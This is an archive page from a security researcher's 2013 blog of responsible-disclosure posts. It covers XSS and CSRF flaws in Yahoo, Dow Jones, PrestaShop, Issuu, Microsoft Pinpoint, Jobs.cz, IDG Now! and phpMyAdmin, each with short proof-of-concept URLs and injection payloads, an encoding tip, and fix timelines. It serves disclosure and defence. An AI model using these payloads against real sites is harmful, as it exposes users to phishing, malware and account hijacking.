Both security issues are located under a vulnerable flash player - [JW Player](http://www.longtailvideo.com/jw-player/) (discovered by [Neal Poole](https://nealpoole.com/blog/2013/04/unpatched-reflected-xss-in-jw-player-5/) on April) that can be used to inject a XSS vector.

This type of attack could be used to trick innocent users, infecting them with malware and even get their accounts hijacked using the name of Yahoo.

Proof-of-concept:
> #1 http://especiales.yahoo.net/turismo-de-tunez/wp-content/themes/studiozen/js/jwplayer/player.swf?playerready=alert("xss by @dsopas")

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi-x2qH2Jq1wNJvMXF12MVFC8qJKic-Lu_Eu3uNapQpF4F-iW7CyMhV7O-OoxIsuWtlBaiqG_vrT8wks5-9Lu9o-7gV_uTBf6y1dg7Ftyu6eDlp-87b2BCrjSRK1KDh2aWlfbvt6CwfLlTD/s320/yahoo_xss.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi-x2qH2Jq1wNJvMXF12MVFC8qJKic-Lu_Eu3uNapQpF4F-iW7CyMhV7O-OoxIsuWtlBaiqG_vrT8wks5-9Lu9o-7gV_uTBf6y1dg7Ftyu6eDlp-87b2BCrjSRK1KDh2aWlfbvt6CwfLlTD/s1600/yahoo_xss.jpg)

> #2 http://www.yahoosportsradio.com/source/mediaplayer/player.swf?playerready=alert("xss by @dsopas")

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhmKOjqOA7L7s2c5rfVF2R5RriColvuRjzhfijz1ycdGtxONN-ZHhLP_YJsjGBadv78ERxA5mptwh1JhqIJ3rr108RdQri6Jf2K3kTOijF-fIc_fDGBzcabAWtA3PPYrnlcmT5eoAILjYsZ/s320/yahoo_xss_sports.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhmKOjqOA7L7s2c5rfVF2R5RriColvuRjzhfijz1ycdGtxONN-ZHhLP_YJsjGBadv78ERxA5mptwh1JhqIJ3rr108RdQri6Jf2K3kTOijF-fIc_fDGBzcabAWtA3PPYrnlcmT5eoAILjYsZ/s1600/yahoo_xss_sports.jpg)

Upgrading JW Player would fix this vulnerability but Yahoo decided to delete because they were old files forgotten on the web sever. Always a priority to delete files that you don't need. They could become a security risk in the future.

Yahoo security team sent me as a gift the DoD T-Shirt and a few other Yahoo merchandise.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi5uVNDq7pofWbKGMlhR4Nm2czvucMSe-B2w_lAmuW7o9XjusMungg4l673uj_sbL23wdDnXUtifbkrqf7BJHt6FAqCb9LkN1eIm85SvtpKIFFGiH60pO8T0eK7FImNmnT9EAjY2exIhn8W/s320/yahoo_mercha.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi5uVNDq7pofWbKGMlhR4Nm2czvucMSe-B2w_lAmuW7o9XjusMungg4l673uj_sbL23wdDnXUtifbkrqf7BJHt6FAqCb9LkN1eIm85SvtpKIFFGiH60pO8T0eK7FImNmnT9EAjY2exIhn8W/s1600/yahoo_mercha.jpg)

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEil_o2tMrE_MLoUx4HVDzcpvMkiZ0EXhlCqt1qlTB-9lVClUBaK4pJ9_vd31gwCjN_g6ivhHQAPKfB5dtFQqC7MgV0_0MkkgQ1xwlH3Uzw12mN2tgxwLezuemwHauQ55u_1u_GE067nGAPx/s320/yahoo_tshirt.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEil_o2tMrE_MLoUx4HVDzcpvMkiZ0EXhlCqt1qlTB-9lVClUBaK4pJ9_vd31gwCjN_g6ivhHQAPKfB5dtFQqC7MgV0_0MkkgQ1xwlH3Uzw12mN2tgxwLezuemwHauQ55u_1u_GE067nGAPx/s1600/yahoo_tshirt.jpg)

I would like to mention that Yahoo fixed both vulnerabilities pretty fast proving that they really care about security.

Timeline #1:

07 Jun 2013: Reported to Yahoo

10 Jun 2013: Fixed by Yahoo

13 Aug 2013: Full disclosure

Timeline #2:

13 Jun 2013: Reported to Yahoo

13 Jun 2013: Fixed by Yahoo

13 Aug 2013: Full disclosure

Update:  The JW Player security issue is also present on [SecurityFocus](http://www.securityfocus.com/bid/54739/info) since 29 July 2012. Thanks to [Avram Marius](http://security-sh3ll.blogspot.com/) for this information.

Posted by
David

at

[6:52 AM](http://davidsopaslabs.blogspot.com/2013/08/vulnerable-jw-player-on-two-yahoo-sites.html "permanent link")

[No comments:](http://davidsopaslabs.blogspot.com/2013/08/vulnerable-jw-player-on-two-yahoo-sites.html#comment-form)

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4083252652650482806&postID=902089817343742414&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=902089817343742414&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=902089817343742414&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=902089817343742414&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=902089817343742414&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=902089817343742414&target=pinterest "Share to Pinterest")

Labels:
[dod](http://davidsopaslabs.blogspot.com/search/label/dod),
[jwplayer](http://davidsopaslabs.blogspot.com/search/label/jwplayer),
[neal poole](http://davidsopaslabs.blogspot.com/search/label/neal%20poole),
[tshirt](http://davidsopaslabs.blogspot.com/search/label/tshirt),
[yahoo](http://davidsopaslabs.blogspot.com/search/label/yahoo)

## Wednesday, July 17, 2013

### [Dowjones.com DOM XSS](http://davidsopaslabs.blogspot.com/2013/07/dowjonescom-dom-xss.html)

> Dow Jones & Company is an American publishing and financial information firm.
> The company was founded in 1882 by three reporters: Charles Dow, Edward Jones, and Charles Bergstresser. Like The New York Times and the Washington Post, the company was in recent years publicly traded but privately controlled. The company was led by the Bancroft family, which effectively controlled 64% of all voting stock, before being acquired by News Corporation.

(in [Wikipedia](http://en.wikipedia.org/wiki/Dow_Jones_%26_Company))

In January I found a couple of issues on a [Eloqua](http://www.eloqua.com/) script (which I don't got any reply, even after I tried to contact them for more than 5 times). This script is used by [Dow Jones](http://www.dowjones.com/) site. Let's take a look into the vulnerable code:
> if (document.referrer) { elqRef2 = document.referrer; }
> if (navigator.appName == 'Netscape' || navigator.userAgent.indexOf("Opera")!=-1) { document.write('<la' + 'yer hidden=true><im' + 'g src="' + elqCurE + '?pps=3&siteid=' + elqSiteID + '&ref2=' + elqRef2 + '&tzo=' + elqTzo + '&ms=' + elqMs + '" border=0 width=1 height=1 ><\/la' + 'yer>');}
> else { document.write('<im' + 'g style="display:none" src="' + elqCurE + '?pps=3&siteid=' + elqSiteID + '&ref2=' + elqRef2 + '&tzo=' + elqTzo + '&ms=' + elqMs + '" border=0 width=1 height=1 >');}

As you can see it was possible to manipulate the document.referrer and write (due to document.write) present on the Eloqua javascript.

How was it possible to attack it?

#1

Simple creating a HTML page with a link to the dowjones.com site, with the XSS vector, the code is executed on the browser.
> http://www.example-site.com/?"><img src=x onerror=prompt(1);><!--

example-site.com will have a link to dowjones.com. When a user click on that link it will redirect to dowjones.com and execute the XSS vector on that page.

#2

This proof-of-concept is much easier to implement. When a user change the page inside dowjones.com, it will execute the XSS vector.
> www.dowjones.com/?"><h1>XSS</h1><!--

You can even play around encoding a little bit to obsucate from inexperient users.
> www.dowjones.com/%3F%22%3E%3Ch1%3EXSS%3C%2Fh1%3E%3C!--

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhEYRg1LhyphenhyphencSossQWKUAdnZ2yMHq9B6K06WWg53S-dbR82HDOXGssLUDhNdVbghTNcEWyCjRqc36FP3IRbiNfbsF2Jz8fswbnFrVeqtcvQ_4d_R7wPjYnxgwmCPwA1NOcbxISXtevg1v1nw/s320/downjones.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhEYRg1LhyphenhyphencSossQWKUAdnZ2yMHq9B6K06WWg53S-dbR82HDOXGssLUDhNdVbghTNcEWyCjRqc36FP3IRbiNfbsF2Jz8fswbnFrVeqtcvQ_4d_R7wPjYnxgwmCPwA1NOcbxISXtevg1v1nw/s1600/downjones.jpg)

Both examples could be used by malicious users to trick victims on scams and even to spread malware.

Dow Jones already fixed this and their solution was to simply remove the script.

Timeline:

21 Mar 2013: Sent this information to Dow Jones

22 Mar 2013: Got a reply

11 Apr 2013: Requested a update about this vulnerability

12 Apr 2013: Got a reply that they were fixing it

03 Jun 2013: Noticed that the issue was fixed and requested an update from Dow Jones (no reply so far)

17 Jul 2013: Full disclosure

Posted by
David

at

[7:02 AM](http://davidsopaslabs.blogspot.com/2013/07/dowjonescom-dom-xss.html "permanent link")

[No comments:](http://davidsopaslabs.blogspot.com/2013/07/dowjonescom-dom-xss.html#comment-form)

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4083252652650482806&postID=730189848404657297&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=730189848404657297&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=730189848404657297&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=730189848404657297&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=730189848404657297&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=730189848404657297&target=pinterest "Share to Pinterest")

Labels:
[dom xss](http://davidsopaslabs.blogspot.com/search/label/dom%20xss),
[dow jones](http://davidsopaslabs.blogspot.com/search/label/dow%20jones),
[referrer](http://davidsopaslabs.blogspot.com/search/label/referrer)

## Monday, July 8, 2013

### [Prestashop persistent XSS and CSRF vulnerability](http://davidsopaslabs.blogspot.com/2013/07/prestashop-persistent-xss-and-csrf.html)

Continuing to [test Prestashop security](http://labs.davidsopas.com/2012/11/prestashop-151-persistent-xss.html) I just found out a vulnerability on the latest version (and maybe prior versions).

Logistician, translators and other low level profiles/accounts could inject a persistent XSS vector on [TinyMCE](http://www.tinymce.com/) to affect users and even admins.

This is possible due to a flaw on TinyMCE which doesn't filter some events (blocks only a couple of them) on HTML.

Proof-of-concept on a combined CSRF attack (logged in as logistician):
> On a CMS page, enter the following HTML in TinyMCE (on HTML mode) <img onmouseover="window.location.href = 'http://www.website-example.pt/loja/admin9050/index.php?logout'" src="x" alt="" />

When the admin hover the image, he will automatically logout from the admin panel.

With a little imagination this issue can be used to spread malware or grab users credentials (popping up a screen to login) to visitors, authenticated users or even admins. (CVE-2013-4791)

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiiCn4cgvU7VeOKiJ7ax0LyZR_ZbL5dpV43RRDiKJfjjLFMFAJWWxm70hDOyQd_zIYwsLZ4-rY0gVshSmSAKS3kvtzfLiMY5u0uIj3rhfiLjxVmCENKTMKrf0R13136TMKjwdVrYAuG-gKt/s320/step1.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiiCn4cgvU7VeOKiJ7ax0LyZR_ZbL5dpV43RRDiKJfjjLFMFAJWWxm70hDOyQd_zIYwsLZ4-rY0gVshSmSAKS3kvtzfLiMY5u0uIj3rhfiLjxVmCENKTMKrf0R13136TMKjwdVrYAuG-gKt/s1600/step1.jpg)

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhlc_ePJST7UIykA-LnGIoqGk9c8R5PqMbd5Y7l5D58pnsjFA4oWF4vw6SsU1DF23wcOwFTdyvVq-eYPWifecQWBWngYKdMpxlv1W_ZKAfvtgw1aScMPpk-D69YlM6t3a-kyZraaf2kkdF3/s320/step2.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhlc_ePJST7UIykA-LnGIoqGk9c8R5PqMbd5Y7l5D58pnsjFA4oWF4vw6SsU1DF23wcOwFTdyvVq-eYPWifecQWBWngYKdMpxlv1W_ZKAfvtgw1aScMPpk-D69YlM6t3a-kyZraaf2kkdF3/s1600/step2.jpg)

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiHjkEaVJhIFdW_mKF26XJMsWdV5K_YIb_RXZZawUiSBLBVz8-PdX8_dz3wAB1O2qDiVJCp1LPJDrJ1zKgJ6j9CTmerq9Pq2-K-6_axHWHfKcorPJH7ozYWq4dput7G19-8V3DhrSwyW9jB/s320/step3.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiHjkEaVJhIFdW_mKF26XJMsWdV5K_YIb_RXZZawUiSBLBVz8-PdX8_dz3wAB1O2qDiVJCp1LPJDrJ1zKgJ6j9CTmerq9Pq2-K-6_axHWHfKcorPJH7ozYWq4dput7G19-8V3DhrSwyW9jB/s1600/step3.jpg)

Also logout GET request should also have a token protection. Just to prevent CSRF attacks. (CVE-2013-4792)

Keep in mind that the latest version of TinyMCE it's patched against this issue.

By the way I tested under PrestaShop 1.5.4.1.

[Prestashop developing team](http://www.prestashop.com/) replied:
> We have fixed this problem in our 1.4.11 release, and we will also put this patch in our next 1.5 release before the end of July.

Timeline:

05 Jun 2013: Reported to Prestashop

11 Jun 2013: Replied that their team were working on it

02 Jul 2013: Prestashop released a fix to this issue

08 Jul 2013: Full disclosure

Posted by
David

at

[6:34 AM](http://davidsopaslabs.blogspot.com/2013/07/prestashop-persistent-xss-and-csrf.html "permanent link")

[4 comments:](http://davidsopaslabs.blogspot.com/2013/07/prestashop-persistent-xss-and-csrf.html#comment-form)

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4083252652650482806&postID=8069146616044966238&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=8069146616044966238&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=8069146616044966238&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=8069146616044966238&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=8069146616044966238&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=8069146616044966238&target=pinterest "Share to Pinterest")

Labels:
[csrf](http://davidsopaslabs.blogspot.com/search/label/csrf),
[CVE-2013-4791](http://davidsopaslabs.blogspot.com/search/label/CVE-2013-4791),
[CVE-2013-4792](http://davidsopaslabs.blogspot.com/search/label/CVE-2013-4792),
[persistent xss](http://davidsopaslabs.blogspot.com/search/label/persistent%20xss),
[prestashop](http://davidsopaslabs.blogspot.com/search/label/prestashop),
[tinymce](http://davidsopaslabs.blogspot.com/search/label/tinymce)

## Tuesday, July 2, 2013

### [Issuu DOM XSS](http://davidsopaslabs.blogspot.com/2013/07/issuu-dom-xss.html)

For those who don't know [Issuu](http://issuu.com/)...
> Issuu is an online service that allows for realistic and customizable viewing of digitally uploaded material, such as portfolios, books, magazine issues, newspapers, and other print media. It integrates with social networking sites to promote uploaded material. While most of the documents are meant to be viewed online, some can be downloaded and saved as well. Uploaded print material is viewed through a web browser and is made to look like a printed publication with an animated page flip option.

I found out that was possible to inject a DOM XSS vector on their code. The vulnerable code was present at embed.html in the following line:
> document.write('<div data-configid="' + location.hash.replace('#', '') + '" class="issuuembed"></div>');

*location.hash.replace* wasn't properly escaped and could be used to lauch DOM XSS attacks by malicious users using sink *document.write*. This could be exploited in phishing attacks or to trick innocent users to click on malicious links (with malware).

Proof of concept:
> http://e.issuu.com/embed.html#1200954/2011806"><a href=# onmouseover=alert(1);>Click here</a><div x="

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhdeVj4V7DAgRV-ttUSOU6eawIo1rym7Z7-coQBvl7gcT6JrglfF6dSD4ENx7nnDVEwBmTi1lFd_tsm3Pwt3yGwFMMrDZ_5QWydXGL9EF-yatDcHTLIPLRkKlz9MpT4CiyILa7ihh6-5mD0/s320/issuu_xss.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhdeVj4V7DAgRV-ttUSOU6eawIo1rym7Z7-coQBvl7gcT6JrglfF6dSD4ENx7nnDVEwBmTi1lFd_tsm3Pwt3yGwFMMrDZ_5QWydXGL9EF-yatDcHTLIPLRkKlz9MpT4CiyILa7ihh6-5mD0/s1440/issuu_xss.jpg)

This DOM XSS vectors could be modified to work on each browser.

Timeline:

17 Jun 2013: Reported to Issuu

17 Jun 2013: Issuu reported that they'll fix it ASAP

25 Jun 2013: Issuu reported that they fixed it

01 Jul 2013: Full disclosure

Posted by
David

at

[1:17 PM](http://davidsopaslabs.blogspot.com/2013/07/issuu-dom-xss.html "permanent link")

[No comments:](http://davidsopaslabs.blogspot.com/2013/07/issuu-dom-xss.html#comment-form)

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4083252652650482806&postID=5372617037698361544&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=5372617037698361544&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=5372617037698361544&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=5372617037698361544&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=5372617037698361544&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=5372617037698361544&target=pinterest "Share to Pinterest")

Labels:
[dom xss](http://davidsopaslabs.blogspot.com/search/label/dom%20xss),
[issuu](http://davidsopaslabs.blogspot.com/search/label/issuu)

## Thursday, June 13, 2013

### [Microsoft Pinpoint vulnerable to DOM XSS](http://davidsopaslabs.blogspot.com/2013/06/microsoft-pinpoint-vulnerable-to-dom-xss.html)

Using a third-party web application, [Microsoft Pinpoint](http://pinpoint.microsoft.com/) site was vulnerable to a DOM XSS that could be used by malicious users to launch attacks.

A user could access [Ensighten Real-Time Tag Management System](http://www.ensighten.com/) by adding the URL parameter "ensightenVT=1" on the pinpoint.microsoft.com. This would allow to check a couple of Ensighten options.

Proof of concept #1:
> http://pinpoint.microsoft.com/en-US/applications/search?sort=rating&q=nothing&fcrc=PRT&ensightenVT=1

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg72H99nKdmDq-I2LPGMfcopM3aKsoDcbzDRHxA3RTJ8nuldkRhpxzENSYSJDtts54qv8hZHSPPbJszkNUH1q89-Di8R1MnkqAL9INcTvSh3wwBHYmS7-jBYjFs_MVo6AcFi4OlXybXhtoC/s320/pinpoint.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg72H99nKdmDq-I2LPGMfcopM3aKsoDcbzDRHxA3RTJ8nuldkRhpxzENSYSJDtts54qv8hZHSPPbJszkNUH1q89-Di8R1MnkqAL9INcTvSh3wwBHYmS7-jBYjFs_MVo6AcFi4OlXybXhtoC/s1600/pinpoint.png)

After this point, a reflected DOM XSS it's present on a couple of places and adding the vector on the previous URL:

Proof of concept #2:
> #"><img src=x onerror=prompt(1);>

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEho06XCr4-kiPJ-osYob8Wy_KEDa16NDut6xP-7gao0i4wW8RUNKmv5c9cnAMrPQg4BhhjqFSFoyevxnbybYBGlwBt8deCn8S1P4k88V5Cs7vRgn8DRe5fEbZhUUXUYeEW4zAJHz7e_iXwq/s320/microsoft.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEho06XCr4-kiPJ-osYob8Wy_KEDa16NDut6xP-7gao0i4wW8RUNKmv5c9cnAMrPQg4BhhjqFSFoyevxnbybYBGlwBt8deCn8S1P4k88V5Cs7vRgn8DRe5fEbZhUUXUYeEW4zAJHz7e_iXwq/s1600/microsoft.png)

... and navigating on some Ensighten options, the vector would execute successfully and automatically.

This was due to a lack of sanitizing location.hash.

Microsoft Security Response Center replied:
> Thank you for reporting this to us.  I want to let you know that we have been able to finish our review of this issue and have fixed this in an online services update.  I would like to provide you with an acknowledgement for working with us on our Online Researcher Acknowledgement page at http://technet.microsoft.com/en-us/security/cc308589.

After getting my name on [Google](http://labs.davidsopas.com/2012/12/google-orkut-html-limitations-bypass.html) and [eBay](http://labs.davidsopas.com/2013/02/ebay-xss-vulnerability.html), currently I'm also listed on Microsoft: (<http://technet.microsoft.com/en-us/security/cc308589>).

Timeline:

19 Mar 2013: Reported to Microsoft

19 Mar 2013: Microsoft reported that will take a look into it

22 Mar 2013: Microsoft reported that this issue is fixed in an online services update

13 Jun 2013: Full disclosure

Posted by
David

at

[1:43 PM](http://davidsopaslabs.blogspot.com/2013/06/microsoft-pinpoint-vulnerable-to-dom-xss.html "permanent link")

[No comments:](http://davidsopaslabs.blogspot.com/2013/06/microsoft-pinpoint-vulnerable-to-dom-xss.html#comment-form)

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4083252652650482806&postID=163118281832985369&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=163118281832985369&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=163118281832985369&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=163118281832985369&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=163118281832985369&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=163118281832985369&target=pinterest "Share to Pinterest")

Labels:
[dom xss](http://davidsopaslabs.blogspot.com/search/label/dom%20xss),
[ensighten](http://davidsopaslabs.blogspot.com/search/label/ensighten),
[microsoft](http://davidsopaslabs.blogspot.com/search/label/microsoft)

### [Jobs.cz XSS vulnerability](http://davidsopaslabs.blogspot.com/2013/06/jobscz-xss-vulnerability.html)

I found that is possible to conduct a XSS attack on career site on [jobs.cz](http://jobs.cz/) by manipulating the URL and injecting Javascript. That way when the user clicked on the link "Apply" - to a job - it will launch the attack.

This could be used to trick innocent users applying to a job on a big company (Jobs.cz customers). When they're clicking on the Apply they could been victims of, for example, redirections to malware sites or drive by downloads.

Proof of concept:
> http://xxxxxxx.jobs.cz/lang/577198204/xxxxxxxx?brand=g2&exportRCM=43374188&trackingBrand=unknown';alert("xss by @dsopas");//&rps=186&ep=

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEilNnyW67Chfi2rxF1ZQEH7eYWhtOQOOmiXFrY8PVyltNdzsXpS7kimTo6lUvvH8qrv7JhF-T1obLQjCmR-mIVgjp6V_2LBXet5mNO3qXNyFM5OXuEENU2F1GfD5X9uj_5hmWlCQ8WEZ2LB/s320/jobscz_xss.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEilNnyW67Chfi2rxF1ZQEH7eYWhtOQOOmiXFrY8PVyltNdzsXpS7kimTo6lUvvH8qrv7JhF-T1obLQjCmR-mIVgjp6V_2LBXet5mNO3qXNyFM5OXuEENU2F1GfD5X9uj_5hmWlCQ8WEZ2LB/s1600/jobscz_xss.jpg)

Keep in mind that Jobs.cz have many important clients like Accenture, KPMG, DHL, ŠKODA AUTO, Telefónica, T-Mobile, BOSCH Group, GE Money, Vodafone, Ernst & Young, SIEMENS, Avast and many others.

I would like to thank the Jobs.cz security team for keeping me updated and providing a solution to this issue very fast. It's always glad to see companies that care about security and appreciate help from outsiders.

Timeline:

23 Apr 2013: Reported to Jobs.cz

24 Apr 2013: First contact with Jobs.cz technical support

25 Apr 2013: Update from Jobs.cz security team

13 May 2013: Patched
13 Jun 2013: Full disclosure

Posted by
David

at

[1:25 PM](http://davidsopaslabs.blogspot.com/2013/06/jobscz-xss-vulnerability.html "permanent link")

[No comments:](http://davidsopaslabs.blogspot.com/2013/06/jobscz-xss-vulnerability.html#comment-form)

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4083252652650482806&postID=8446895834277797462&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=8446895834277797462&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=8446895834277797462&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=8446895834277797462&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=8446895834277797462&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=8446895834277797462&target=pinterest "Share to Pinterest")

Labels:
[jobs.cz](http://davidsopaslabs.blogspot.com/search/label/jobs.cz),
[xss](http://davidsopaslabs.blogspot.com/search/label/xss)

## Tuesday, April 23, 2013

### [IDG Now! vulnerable to reflected XSS](http://davidsopaslabs.blogspot.com/2013/04/idg-now-vulnerable-to-reflected-xss.html)

[IDG Now!](http://idgnow.uol.com.br/) is one of the most popular brazilian IT online mags and a reference in portuguese language. It has millions of visits each day and a large community on social networks.

The site suffered from a reflected DOM XSS present on the JavaScript code for the AnythingSlider.

Vulnerable code:
> a.gotoHash = function() {
> var c = a.win.location.hash,
> (...)

The location.hash wasn't sanitized and it was possible for a user to manipulate the URL injecting a XSS vector.

Proof of concept:
> http://idgnow.uol.com.br/#<img src=x onerror=prompt(1);>

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjVsKDq40p8TnU0jWZyVt0koA1XizVSaaZ4xXHwB5L0xmmH4NjlMmf1CRsw2PEyAWrE5i9PGtw5tQUpfOrOMNlkNEHHVQnp-8gvSSqGLxZSTrEqqoY_lqNbsUnJ0gC480WdNDEP_NT5MxG_/s320/idgnow_domxss.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjVsKDq40p8TnU0jWZyVt0koA1XizVSaaZ4xXHwB5L0xmmH4NjlMmf1CRsw2PEyAWrE5i9PGtw5tQUpfOrOMNlkNEHHVQnp-8gvSSqGLxZSTrEqqoY_lqNbsUnJ0gC480WdNDEP_NT5MxG_/s1600/idgnow_domxss.png)

Also, the [jQuery](http://jquery.com/) version was outdated.

The Developing team for IDG Now! reported that they fixed the DOM XSS issue and updated the jQuery framework.

Timeline:

23 Mar 2013: Reported to IDG Now!

26 Mar 2013: Fixed by their developing team.

23 Apr 2013: Full disclosure.

Posted by
David

at

[8:13 AM](http://davidsopaslabs.blogspot.com/2013/04/idg-now-vulnerable-to-reflected-xss.html "permanent link")

[No comments:](http://davidsopaslabs.blogspot.com/2013/04/idg-now-vulnerable-to-reflected-xss.html#comment-form)

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4083252652650482806&postID=1336191874493792131&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=1336191874493792131&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=1336191874493792131&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=1336191874493792131&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=1336191874493792131&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=1336191874493792131&target=pinterest "Share to Pinterest")

Labels:
[anythingslider](http://davidsopaslabs.blogspot.com/search/label/anythingslider),
[dom xss](http://davidsopaslabs.blogspot.com/search/label/dom%20xss),
[idg now](http://davidsopaslabs.blogspot.com/search/label/idg%20now)

## Friday, April 12, 2013

### [phpMyAdmin XSS](http://davidsopaslabs.blogspot.com/2013/04/phpmyadmin-xss_12.html)

For those who don't know [phpMyAdmin](http://www.phpmyadmin.net/), is a free software tool written in PHP, intended to handle the administration of MySQL over the World Wide Web. phpMyAdmin supports a wide range of operations with MySQL. The most frequently used operations are supported by the user interface (managing databases, tables, fields, relations, indexes, users, permissions, etc), while you still have the ability to directly execute any SQL statement.

When using it on a client I found out that, under versions 3.5.3, 3.5.4  and 3.5.5, it was possible to inject a self-XSS.

The vulnerability is under "Query results operations" - "Display Chart" and "Title" field. When writing the title with a XSS vector the code is automatically executed.

Proof of concept:
> Chart title"><script>alert("xss by @dsopas")

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjrcsY-mC35U0mP-XiL38PRgfmBjzI8pSXc1HxBjHsibnVo6bC8qjzazTyJKhl10tgz6Lup_seHZmedz5IBdgSzc_0ZEU3_IlahnWH7Fy4FqfM07yWj54WQpD-23ft80xCAbsxWBbY4VOXr/s320/phpmyadmin.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjrcsY-mC35U0mP-XiL38PRgfmBjzI8pSXc1HxBjHsibnVo6bC8qjzazTyJKhl10tgz6Lup_seHZmedz5IBdgSzc_0ZEU3_IlahnWH7Fy4FqfM07yWj54WQpD-23ft80xCAbsxWBbY4VOXr/s1600/phpmyadmin.jpg)

This bug was fixed (version 3.5.6) but per their policy for self-XSS, they decided against a

security release.

The commit is <https://github.com/phpmyadmin/phpmyadmin/commit/d30aaae>.

Timeline:

10 Jan 2013: Reported to phpMyAdmin security team

10 Jan 2013: They replied and told me that they're investigating

15 Mar 2013: I asked for update - reported that it is already been fixed since January

